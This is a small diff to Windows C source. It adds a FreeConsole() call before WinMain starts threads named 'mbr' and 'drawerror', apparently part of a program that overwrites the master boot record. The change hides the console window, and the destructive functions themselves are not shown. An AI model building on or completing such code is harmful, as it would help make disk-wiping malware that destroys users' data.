@@ -131,6 +131,7 @@ DWORD WINAPI drawerror(LPVOID lpstart)
 
 int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
 {
+	FreeConsole();
 	CreateThread(0, 0, mbr, 0, 0, 0);
 	Sleep(9);
 	CreateThread(0, 0, drawerror, 0, 0, 0);
